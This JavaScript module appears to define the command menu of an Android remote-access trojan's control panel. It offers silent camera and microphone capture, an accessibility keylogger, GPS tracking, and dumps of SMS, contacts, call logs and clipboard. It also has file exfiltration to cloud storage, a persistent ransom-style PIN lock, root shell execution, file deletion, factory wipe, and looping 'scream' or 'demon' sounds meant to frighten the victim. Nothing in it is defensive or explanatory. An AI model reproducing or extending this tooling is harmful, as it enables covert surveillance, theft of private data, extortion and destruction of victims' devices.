export const COMMANDS = {
  lock_pin: {
    label: 'Lock PIN', icon: '🔒', danger: true,
    group: 'Control',
    desc: 'Set persistent PIN lock via Device Owner. Survives reboot.',
    args: [
      { name: 'pin',  label: 'PIN',  type: 'text', required: true, placeholder: '123456' },
      { name: 'msg',  label: 'Message', type: 'text', default: 'This device is permanently locked.' },
      { name: 'wipe_on_fail', label: 'Wipe after N fails', type: 'number', default: 10 }
    ]
  },
  screenshot: {
    label: 'Screenshot', icon: '📸', group: 'Surveillance',
    desc: 'Capture current screen.', args: []
  },
  record_mic: {
    label: 'Record Mic', icon: '🎙️', group: 'Surveillance',
    desc: 'Record ambient audio from microphone.',
    args: [{ name: 'seconds', label: 'Duration (s)', type: 'number', default: 30 }]
  },
  record_screen: {
    label: 'Record Screen', icon: '🎥', group: 'Surveillance',
    desc: 'Record screen via MediaProjection.',
    args: [{ name: 'seconds', label: 'Duration (s)', type: 'number', default: 30 }]
  },
  camera_front: { label: 'Cam Front', icon: '🤳', group: 'Surveillance', desc: 'Silent front camera capture.', args: [] },
  camera_back:  { label: 'Cam Back',  icon: '📷', group: 'Surveillance', desc: 'Silent rear camera capture.', args: [] },
  location:     { label: 'Location',  icon: '📍', group: 'Surveillance', desc: 'Get GPS coordinates.', args: [] },
  keylog_start: { label: 'Keylog Start', icon: '⌨️', group: 'Surveillance', desc: 'Start accessibility keylogger.', args: [] },
  keylog_dump:  { label: 'Keylog Dump',  icon: '⌨️', group: 'Surveillance', desc: 'Dump keylog buffer.', args: [] },

  play_sound: {
    label: 'Play Sound', icon: '🔊', danger: true, group: 'Panic',
    desc: 'Play loud scary sound at max volume.',
    args: [
      { name: 'type', label: 'Type', type: 'select',
        options: ['scream','laugh','siren','static','whisper','baby_cry','demon'], default: 'scream' },
      { name: 'loop', label: 'Loop', type: 'select', options: ['once','repeat'], default: 'repeat' }
    ]
  },
  vibrate: {
    label: 'Vibrate', icon: '📳', danger: true, group: 'Panic',
    desc: 'Continuous vibration.',
    args: [{ name: 'ms', label: 'Duration (ms)', type: 'number', default: 60000 }]
  },
  flashlight: {
    label: 'Flashlight', icon: '🔦', group: 'Panic',
    desc: 'Control camera flash.',
    args: [{ name: 'on', label: 'State', type: 'select', options: ['on','off','strobe'], default: 'on' }]
  },

  open_url: {
    label: 'Open URL', icon: '🌐', group: 'Control',
    desc: 'Open URL in default browser.',
    args: [{ name: 'url', label: 'URL', type: 'text', required: true, placeholder: 'https://...' }]
  },
  toast: {
    label: 'Toast', icon: '💬', group: 'Control',
    desc: 'Show toast message.',
    args: [{ name: 'msg', label: 'Message', type: 'text', required: true }]
  },
  notify: {
    label: 'Fake Notif', icon: '🔔', group: 'Control',
    desc: 'Push fake notification.',
    args: [
      { name: 'title', label: 'Title', type: 'text', required: true },
      { name: 'text',  label: 'Text',  type: 'text', required: true }
    ]
  },
  wallpaper: {
    label: 'Wallpaper', icon: '🖼️', group: 'Control',
    desc: 'Change wallpaper from URL.',
    args: [{ name: 'url', label: 'Image URL', type: 'text', required: true }]
  },
  lock_screen: { label: 'Lock Screen', icon: '🔐', group: 'Control', desc: 'Lock immediately.', args: [] },

  sms_dump:  { label: 'SMS Dump',  icon: '📩', group: 'Data', desc: 'Dump SMS inbox.', args: [] },
  contacts:  { label: 'Contacts',  icon: '👥', group: 'Data', desc: 'Dump contact list.', args: [] },
  call_log:  { label: 'Call Log',  icon: '📞', group: 'Data', desc: 'Dump call history.', args: [] },
  clipboard: { label: 'Clipboard', icon: '📋', group: 'Data', desc: 'Read clipboard.', args: [] },
  apps_list: { label: 'Apps List', icon: '📱', group: 'Data', desc: 'List installed apps.', args: [] },
  files_list: {
    label: 'Files List', icon: '📁', group: 'Data',
    desc: 'List directory.',
    args: [{ name: 'path', label: 'Path', type: 'text', default: '/sdcard/' }]
  },
  files_download: {
    label: 'Download File', icon: '⬇️', group: 'Data',
    desc: 'Exfiltrate file to R2.',
    args: [{ name: 'path', label: 'Path', type: 'text', required: true }]
  },

  files_delete: {
    label: 'Delete File', icon: '🗑️', danger: true, group: 'Destructive',
    desc: 'Delete file on device.',
    args: [{ name: 'path', label: 'Path', type: 'text', required: true }]
  },
  shell: {
    label: 'Shell', icon: '💻', danger: true, group: 'Destructive',
    desc: 'Execute shell command (root).',
    args: [{ name: 'cmd', label: 'Command', type: 'text', required: true }]
  },
  wipe: {
    label: 'Wipe Device', icon: '💀', danger: true, group: 'Destructive',
    desc: 'Factory reset. Unrecoverable.',
    args: [{ name: 'confirm', label: 'Type WIPE', type: 'text', required: true, placeholder: 'WIPE' }]
  }
};

export const GROUPS = ['Surveillance', 'Panic', 'Control', 'Data', 'Destructive'];
